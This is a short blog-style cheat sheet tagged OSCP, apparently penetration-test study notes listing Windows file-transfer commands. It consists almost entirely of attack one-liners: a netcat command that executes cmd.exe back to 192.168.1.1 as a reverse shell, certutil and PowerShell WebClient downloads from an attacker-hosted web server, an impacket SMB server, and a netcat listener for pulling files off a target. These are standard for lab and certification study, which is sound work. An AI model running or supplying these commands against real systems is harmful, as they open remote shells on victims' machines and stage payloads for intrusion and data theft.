---
title: Windows File Transfers
author: linatl
date: "2021-03-10 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Start a webserver
```
Python3
> sudo python3 -m http.server 80
Python2
> sudo python -m SimpleHTTPServer 80
```


###### File uploads to target
```
impacket-smbserver.py
```

###### File uploads on target system
```
netcat
\\192.168.1.1\secure\nc64.exe 192.168.1.1 80 -e cmd.exe

certutil
certutil.exe -urlcache -f http://192.168.1.1/file.txt file.txt

Using powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1:80/file.txt', 'C\file.txt')
```


###### File downloads from target
```
netcat
nc -nvlp 80 < $FILENAME
```
